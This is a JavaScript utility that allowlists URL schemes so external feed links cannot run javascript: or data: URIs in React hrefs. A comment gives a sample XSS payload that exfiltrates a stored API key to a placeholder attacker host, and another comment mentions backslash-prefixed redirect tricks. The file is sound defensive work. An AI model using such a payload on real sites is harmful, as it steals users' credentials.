// safeUrl — scheme allowlist for any URL that flows into an href/src from
// EXTERNAL data (news RSS links, Notion page URLs, etc.).
//
// React 18 does NOT scrub `javascript:` / `data:` URIs in href — it only logs a
// console warning — so an external feed item whose <link> is
// `javascript:fetch('https://evil/?k='+sessionStorage.anthropic_key)` would
// execute on click. This guard returns the URL only when its scheme is http(s)
// (or a protocol-relative/relative URL), and undefined otherwise so the caller
// can render a plain, non-clickable element instead.

export function safeUrl(u) {
  if (u == null) return undefined
  const s = String(u).trim()
  if (!s) return undefined
  // 瀏覽器會把 \ 正規化成 /，所以 "/\evil.com"、"\\evil.com" 實際上是
  // protocol-relative 外部導向——先擋掉再放行相對路徑。
  if (s.startsWith('/\\') || s.startsWith('\\')) return undefined
  // Allow relative and protocol-relative URLs (no scheme to abuse).
  if (s.startsWith('/') || s.startsWith('#') || s.startsWith('./') || s.startsWith('../')) return s
  if (s.startsWith('//')) return s
  try {
    const p = new URL(s, typeof location !== 'undefined' ? location.origin : 'https://example.com')
    return (p.protocol === 'https:' || p.protocol === 'http:') ? s : undefined
  } catch {
    return undefined
  }
}
